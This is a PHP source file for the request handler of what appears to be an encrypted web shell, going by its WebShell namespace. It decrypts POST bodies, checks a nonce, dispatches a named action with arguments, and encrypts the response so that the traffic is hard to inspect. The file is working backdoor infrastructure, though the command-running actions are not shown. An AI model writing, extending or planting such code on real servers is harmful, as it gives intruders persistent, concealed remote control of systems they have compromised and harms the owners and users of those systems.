<?php
namespace WebShell;

class RequestHandler extends Singleton
{
    private $actions = [];

    public function addAction(string $key, Action $action): void
    {
        $this->actions[$key] = $action;
    }

    public function handle(): ?string
    {
        // Prepare request object
        $request = $this->unpackRequest();
        $response = null;

        // Validate the request and decrypt body
        if ($this->validateRequest($request)) {
            $body = [];

            // Check if there is an appropriate handler configured
            if (array_key_exists($request->getAction(), $this->actions)) {
                // Call the appropriate action
                $body['output'] = $this->actions[$request->getAction()]->run($request->getArgs());

                // Encrypt the response's body and build the response
                $response = SecurityService::getInstance()->encrypt(json_encode($body));
                $response = json_encode($response);
                http_response_code(200);
            } else {
                http_response_code(404);
            }

        } else {
            // Set 403 status code 
            http_response_code(403);
        }

        // Set the content-type header
        header('Content-Type: application/json');
        return $response;
    }

    private function unpackRequest(): Request
    {
        // Decrypt request body
        $iv = base64_decode($_POST['iv']);
        $encryptedBody = $_POST['body'];
        $jsonBody = SecurityService::getInstance()->decrypt($encryptedBody, $iv);

        // If the body cannot be decripted, return empty request. Otherwise, populate its values
        if ($jsonBody !== '') {
            $body = json_decode($jsonBody);
            $request = new Request(
                $_SERVER['REMOTE_ADDR'],
                property_exists($body, 'action') ? $body->action : null,
                property_exists($body, 'args') ? $body->args : null,
                property_exists($body, 'nonce') ? $body->nonce : null
            );
        } else {
            $request = new Request();
        }

        return $request;
    }

    private function validateRequest(Request $request): bool
    {
        return SecurityService::getInstance()->validate($request);
    }
}
?>
